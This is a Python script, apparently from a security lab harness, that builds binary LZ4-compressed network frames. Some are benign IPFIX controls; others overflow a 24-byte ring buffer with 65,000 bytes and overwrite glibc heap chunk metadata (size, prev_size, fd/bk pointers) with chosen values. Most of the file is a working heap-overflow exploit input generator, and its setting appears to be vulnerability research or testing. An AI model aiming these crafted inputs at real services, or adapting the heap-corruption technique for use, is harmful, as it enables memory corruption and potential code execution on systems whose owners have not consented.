#!/usr/bin/env python3
"""Craft the TCP/LZ4 wire input from the two attacker-controlled fields.
Copied from the frontier harness generator; writes only into this lab dir.
"""
from pathlib import Path
import struct

HERE = Path(__file__).resolve().parent
OUT = HERE / "out"


def lz4_literals(payload: bytes) -> bytes:
    n = len(payload)
    block = bytearray([(15 if n >= 15 else n) << 4])
    if n >= 15:
        rem = n - 15
        while rem >= 255:
            block.append(255)
            rem -= 255
        block.append(rem)
    block += payload
    return bytes(block)


def wire(ring: int, declared: int, payload: bytes) -> bytes:
    body = lz4_literals(payload)
    return (struct.pack("<I", 0x4C5A3463) + struct.pack(">I", ring)
            + struct.pack(">HH", declared, len(body)) + body)


def main():
    OUT.mkdir(exist_ok=True)
    # A clean control decodes to one whole 24-byte IPFIX message: version 10,
    # length 24 (network order), within the 24-byte ring.
    benign_payload = b"\x00\x0a\x00\x18" + b"\x00" * 20
    crafted = bytearray(b"\x5a" * 65000)
    # The ring's first byte past its end (payload offset 24) is the size field
    # of the glibc chunk at ring+16. Give it a valid 0x6000 size, put the same
    # value at p+size (next chunk's prev_size), and chosen bytes in p->fd/bk.
    crafted[24:32] = struct.pack("<Q", 0x6000)
    crafted[24592:24600] = struct.pack("<Q", 0x6000)
    crafted[32:40] = struct.pack("<Q", 0x4141414141414141)
    crafted[40:48] = struct.pack("<Q", 0x4242424242424242)
    cases = {
        "attack": wire(24, 65000, b"\x5a" * 65000),
        "attack_diff": wire(24, 65000, b"\x41" * 65000),
        "attack_crafted": wire(24, 65000, bytes(crafted)),
        "benign": wire(24, len(benign_payload), benign_payload),
    }
    for name, data in cases.items():
        (OUT / f"wire-{name}.bin").write_bytes(data)
        print(f"{name}: bytes={len(data)}")


if __name__ == "__main__":
    main()
